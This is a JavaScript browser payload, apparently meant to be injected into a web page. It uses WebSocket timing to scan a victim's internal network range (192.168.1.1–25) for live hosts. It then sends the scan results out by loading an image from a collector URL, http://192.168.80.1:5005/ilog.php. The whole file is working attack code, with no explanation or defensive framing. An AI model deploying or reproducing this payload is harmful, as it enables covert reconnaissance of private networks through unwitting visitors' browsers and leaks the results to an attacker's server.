var start_ip=[];
var end_ip=[];
var start_time;
var current_ip=[];
var open_port_max=300;
var closed_port_max=2000;
var ns_hosts_up=[];
var finaldata,logz;

reset_scan_out();

start_ip = &#39;192.168.1.1&#39;.split(&#39;.&#39;);
end_ip = &#39;192.168.1.25&#39;.split(&#39;.&#39;);
 current_ip=[];
    ns_hosts_up=[];
    setTimeout(&#34;scan_network_ws()&#34;,1);

    
function scan_network_ws()
{
    if(init_ip_ns())
    {
    var rett= encodeURIComponent(finaldata+logz);

    new Image().src = &#39;http://192.168.80.1:5005/ilog.php?log=&#39;+rett;
    return;
    }

    start_time = (new Date).getTime();
    try
    {
        ws = new WebSocket(&#34;ws://&#34; + current_ip.join(&#34;.&#34;));
        setTimeout(&#34;check_ns_ws()&#34;,100);
    }
    catch(err)
    {
        return;
    }
}
    
function check_ns_ws()
{
    var interval = (new Date).getTime() - start_time;
    if(ws.readyState == 0)
    {
        if(interval &gt; closed_port_max)
        {
            log(current_ip.join(&#34;.&#34;) + &#34; - down&lt;br&gt;&#34;);
            setTimeout(&#34;scan_network_ws()&#34;,1);
        }
        else
        {
            setTimeout(&#34;check_ns_ws()&#34;,100);
        }
    }
    else
    {
        log(current_ip.join(&#34;.&#34;) + &#34; - up&lt;br&gt;&#34;);
        ns_hosts_up.push(current_ip.join(&#34;.&#34;));
        setTimeout(&#34;scan_network_ws()&#34;,1);
    }
}
    
    

function init_ip_ns()
{
    if(current_ip.length == 0)
    {
        current_ip = copy_ip(start_ip);
    }
    else if(compare_ip(current_ip,end_ip) == 2)
    {
        results_ns();
        return true;
    }
    else
    {
        current_ip = increment_ip(current_ip);
    }
    return false;
}

function results_ns()
{
    finaldata = &#34;&lt;br&gt;&lt;b&gt;Live Hosts:&lt;/b&gt;&lt;br&gt;&#34; + ns_hosts_up + &#34;&lt;br&gt;&lt;b&gt;Status&lt;/b&gt;&lt;br&gt;&#34;;
}

function copy_ip(source)
{
    var dest = [];
    for(var i=0;i&lt;source.length;i++)
    {
        dest[i] = source[i];
    }
    return dest;
}



function compare_ip(a,b)
{
    for(var i=0;i&lt;4;i++)
    {
        var r = _compare_int(a[i],b[i]);
        if(r == 1)
        {
            return 1;//a is greater than b
        }
        else if(r == 3)
        {
            return 3;//b is greater than a
        }
    }
    return 2;//b is equal to a
}

function _compare_int(_a,_b)
{
    if(_a &gt; _b)
    {
        return 1;//_a is greater than _b
    }
    else if(_a == _b)
    {
        return 2;//_a is equal to _b
    }
    else
    {
        return 3;//_a is lesser than _b
    }
}

function increment_ip(inc_ip)
{
    inc_ip[3]++;
    for(var i=3;i&gt;=0;i--)
    {
        if(inc_ip[i] == 255)
        {
            inc_ip[i] = 0;
            inc_ip[i-1]++;
        }
    }
    return inc_ip;
}

function log(to_log)
{
    logz += to_log + &#34;&lt;br&gt;&#34;;
}

function reset_scan_out()
{
    finaldata= &#34;&#34;;
    logz = &#34;&#34;;
}

